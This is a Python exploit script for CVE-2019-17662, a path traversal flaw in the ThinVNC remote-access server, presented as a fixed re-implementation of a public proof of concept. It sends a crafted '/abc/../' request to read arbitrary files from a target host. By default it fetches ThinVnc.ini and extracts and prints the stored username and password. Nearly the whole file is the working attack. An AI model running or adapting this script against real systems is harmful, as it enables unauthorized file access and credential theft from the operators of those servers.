#!/usr/bin/python3
#TinyVNC Arbitrary File Read
#CVE-2019-17662
#Re-implementation of broken PoC (EDB ID: 47519)
#AG | MuirlandOracle
#08/21

import sys, os, requests, re, argparse
from urllib3.exceptions import InsecureRequestWarning

#### Ignore Unverified SSL certs ####
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class Exploit():
    def __init__(self):
        self.colours = self.Colours(self)
        self.s = requests.Session()
        self.s.verify = False

    #### Display ####
    class Colours():
        red = "\033[91m"
        green = "\033[92m"
        blue = "\033[34m"
        orange = "\033[33m"
        purple = "\033[35m"
        end = "\033[0m"

        def __init__(self, outer):
            self.parent = outer

        def print(self, msgType, text, die=True):
            if msgType == "fail":
                if not self.parent.args.accessible:
                    print(f"{self.red}[-] {text}{self.end}")
                else:
                    print(f"Failure: {text}")
                if die:
                    sys.exit(0)
            elif msgType == "success":
                if not self.parent.args.accessible:
                    print(f"{self.green}[+] {text}{self.end}")
                else:
                    print(f"Success: {text}")
            elif msgType == "warn":
                if not self.parent.args.accessible:
                    print(f"{self.orange}[*] {text}{self.end}")
                else:
                    print(f"Warning: {text}")
            elif msgType == "info":
                if not self.parent.args.accessible:
                    print(f"{self.blue}[*] {text}{self.end}")
                else:
                    print(f"Info: {text}")
            else:
                raise ValueError("Invalid colour function selected")


        def printBanner(self):
            if not self.parent.args.accessible:
                print(f"""{self.orange}
     _____ _     _    __     ___   _  ____ 
    |_   _| |__ (_)_ _\ \   / / \ | |/ ___|
      | | | '_ \| | '_ \ \ / /|  \| | |    
      | | | | | | | | | \ V / | |\  | |___ 
      |_| |_| |_|_|_| |_|\_/  |_| \_|\____|

                            {self.purple}@MuirlandOracle{self.end}

                """)

            else:
                print("ThinVNC Arbitrary File Read | @MuirlandOracle")



    ### Argument Parsing ####
    def parseArgs(self):
        parser = argparse.ArgumentParser(description="CVE-2019-17662 ThinVNC Arbitrary File Read")
        parser.add_argument("host", help="The target IP or domain")
        parser.add_argument("port", type=int, help="The target port (1-65535)")
        parser.add_argument("-f","--file", default="../ThinVnc.ini", help="The file to read (default: ../ThinVnc.ini")
        parser.add_argument("-s","--ssl", default=False, action="store_true",  help="Does the server use SSL?")
        parser.add_argument("--accessible", default=False, action="store_true", help="Remove banners and make exploit friendly for screen readers")
        self.args = parser.parse_args()
        if self.args.port not in range(1,65535):
            self.colours.print("fail", f"Invalid port number: {self.args.port}")
        self.args.host = re.sub("https?://|\/$", "", self.args.host)
        
    #### Perform the path traversal ####
    def exploit(self):
        url = f"""{"https" if self.args.ssl else "http"}://{self.args.host}:{self.args.port}/abc/../{self.args.file}"""
        req = requests.Request(method="GET", url=url)
        prep = req.prepare()
        prep.url = url
        try:
            r = self.s.send(prep, timeout=3)
        except requests.exceptions.ConnectTimeout:
            self.colours.print("fail", f"Could not connect to the target ({self.args.host}:{self.args.port})")
        except KeyboardInterrupt:
            self.colours.print("info", "Exiting...")
            return
        except:
            self.colours.print("fail", f"Could not connect to target: {self.args.host}")

        if r.status_code != 200:
            self.colours.print("fail", "Error retrieving file")
        
        if self.args.file != "../ThinVnc.ini":
            self.colours.print("success", f"Retrieved file ({self.args.file}):")
            print(r.text)
            return

        creds = re.findall("(?:User|Password)=([^\r]*)", r.text)
        if len(creds) < 2:
            self.colours.print("fail", "Unable to retrieve credentials")
        self.colours.print("success", "Credentials Found!")
        print(f"""Username:\t{creds[0]}\nPassword:\t{creds[1]}\n\n""")


if __name__ == '__main__':
    exploit = Exploit()
    exploit.parseArgs()
    exploit.colours.printBanner()
    exploit.exploit()
